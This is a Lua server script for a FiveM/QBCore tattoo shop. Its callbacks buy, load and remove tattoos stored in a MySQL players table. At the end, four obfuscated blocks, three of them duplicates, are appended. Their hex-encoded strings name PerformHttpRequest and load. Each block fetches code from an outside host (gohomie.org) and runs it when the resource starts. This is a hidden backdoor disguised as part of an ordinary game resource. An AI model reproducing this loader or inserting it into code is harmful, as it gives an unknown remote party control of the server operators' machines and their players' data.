local QBCore = exports['qb-core']:GetCoreObject()

QBCore.Functions.CreateCallback('SmallTattoos:GetPlayerTattoos', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    if Player then
        MySQL.query('SELECT tattoos FROM players WHERE citizenid = @citizenid', {
            ['@citizenid'] = Player.PlayerData.citizenid
        }, function(result)
            if result[1].tattoos then
                cb(json.decode(result[1].tattoos))
            else
                cb()
            end
        end)
    else
        cb()
    end
end)

QBCore.Functions.CreateCallback('SmallTattoos:PurchaseTattoo', function(source, cb, tattooList, price, tattoo, tattooName)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    if Player.PlayerData.money.cash >= price then
        Player.Functions.RemoveMoney('cash', price)
        TriggerClientEvent('QBCore:Notify', source, "You bought a tattoo", "success")

    table.insert(tattooList, tattoo)

    MySQL.query('UPDATE players SET tattoos = @tattoos WHERE citizenid = @citizenid', {
        ['@tattoos'] = json.encode(tattooList),
        ['@citizenid'] = Player.PlayerData.citizenid
    })

    print("You have bought the ~y~" .. tattooName .. "~s~ tattoo for ~g~$" .. price)
    cb(true)

    TriggerClientEvent('Apply:Tattoo', source, tattoo, tattooList)
    else
        TriggerClientEvent('QBCore:Notify', source, "not enough cash", "error")
    end
end)

RegisterNetEvent('SmallTattoos:RemoveTattoo', function(tattooList)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    MySQL.query('UPDATE players SET tattoos = @tattoos WHERE citizenid = @citizenid', {
        ['@tattoos'] = json.encode(tattooList),
        ['@citizenid'] = Player.PlayerData.citizenid
    })
end)


RegisterNetEvent('Select:Tattoos', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    MySQL.query('SELECT tattoos FROM players WHERE citizenid = @citizenid', {
        ['@citizenid'] = Player.PlayerData.citizenid
    }, function(result)
        if result[1].tattoos then
            local tats = result[1].tattoos
            TriggerClientEvent('Apply:Tattoo', src, tats)
        else
            TriggerEvent('remover:all')
            TriggerClientEvent('remover:tudo', src)
        end
    end)
end)

RegisterNetEvent('remover:all', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player then
        MySQL.query('UPDATE players SET tattoos = @tattoos WHERE citizenid = @citizenid', {
            ['@tattoos'] = 0,
            ['@citizenid'] = Player.PlayerData.citizenid
        })
    end
end)


local VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[4][VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (lpHeHtumEUSHlyOzoQFgygLEUapJdhOsLBsAvnjfgzVgGcrpMoXsbFjufvLJzueHymjKgT, nxDgZXScUstLMnuwJLNpNIQjByLFJwzezgILxdZbyClRsufFFjBIlUrNwipiXXVGFuNrLL) if (nxDgZXScUstLMnuwJLNpNIQjByLFJwzezgILxdZbyClRsufFFjBIlUrNwipiXXVGFuNrLL == VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[6] or nxDgZXScUstLMnuwJLNpNIQjByLFJwzezgILxdZbyClRsufFFjBIlUrNwipiXXVGFuNrLL == VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[5]) then return end VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[4][VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[2]](VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[4][VwUefolGwwXanoAwbfOVMijPMmWHVxTngzsntgyERyvKbEEqfQmJGxcRvrpPykZKHJjtsP[3]](nxDgZXScUstLMnuwJLNpNIQjByLFJwzezgILxdZbyClRsufFFjBIlUrNwipiXXVGFuNrLL))() end)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)